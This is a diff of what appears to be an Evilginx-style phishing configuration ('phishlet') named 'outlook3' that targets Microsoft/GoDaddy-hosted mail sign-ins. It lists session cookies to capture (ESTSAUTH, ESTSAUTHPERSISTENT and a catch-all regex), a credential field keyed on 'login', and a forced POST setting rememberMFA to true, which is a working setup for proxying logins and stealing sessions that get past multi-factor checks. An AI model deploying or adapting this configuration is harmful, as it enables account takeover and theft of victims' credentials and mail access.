@@ -1,3 +1,4 @@
+name:  'outlook3'
 author: '@an0nud4y'
 min_ver: '2.3.0'
 proxy_hosts:
@@ -26,11 +27,7 @@ auth_tokens:
   - domain: 'godaddy.com'
     keys: ['esctx', 'ESTSAUTHPERSISTENT', 'ESTSAUTH', 'ch', 'CCState', 'CcsSharedSignInState', '.*,regexp'] 
 
-auth_urls:
-  - '/'
-  - '/mail/inbox'
-  
-    
+
 credentials:
   username:
     key: 'login'
@@ -56,4 +53,5 @@ force_post:
     force:
       - {key: 'rememberMFA', value: 'true'}
     type: 'post'
+
 
